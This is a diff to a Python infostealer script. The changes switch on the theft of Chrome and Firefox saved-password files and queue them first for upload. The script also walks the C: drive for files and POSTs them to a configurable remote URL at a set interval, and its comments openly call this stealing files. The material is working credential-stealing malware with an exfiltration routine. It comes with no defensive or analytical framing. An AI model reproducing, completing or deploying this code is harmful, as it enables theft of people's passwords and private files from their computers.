@@ -5,12 +5,13 @@ from contextlib import ExitStack
 
 URL = 'https://0.0.0.0' # the URL/IP to which you want to send the stolen files/information to
 INTERVAL = 60.0 # Interval between sending files (in seconds). Don't make this too low because you're going to DDOS yourself.
-#USERNAME = os.getlogin()
-#GOOGLE_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data\Default' # location of Google passwords
-#FIREFOX_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json' # location of Firefox passwords
+USERNAME = os.getlogin()
+GOOGLE_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data\Default' # location of Google passwords
+FIREFOX_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json' # location of Firefox passwords
 
 #file_types = ['.txt'] # if checking for multiple file types
-files_found = [] # log files found
+files_found = [GOOGLE_PASSWORDS,FIREFOX_PASSWORDS] # log files found.
+# NOTE: Files of interest are already in list so they can be sent right at the start.
 
 def file_search():
     for dir, sdirs, files in os.walk('C:\\'): # dir - directories, sdirs - subdirectories
@@ -31,8 +32,7 @@ def steal_files(): # steal files
         for file in files_found[:count-1]:
             file_name = os.path.basename(file) # get the file name from the path
             f = stack.enter_context(open(file, 'rb')) # open the file in read-only mode binary
-            #f_objs.append(f) # add the file to the list of files opened to clean up later
-            files_payload[f"file{i}"] = (file_name, f) # make the payload for the file containing the file name and the file in binary and add it to the list of payloads
+            files_payload[f"file{i}"] = (file_name, f) # make the payload for the file containing the file name and the file in binary and add it to the list of the payload
             i += 1 # add 1 to the counter so the file keys enumerate ex. {'file1:(..),file2:(..), and so on'}
         r = requests.post(URL, files=files_payload) # POST (send) the file
     if not r.ok:
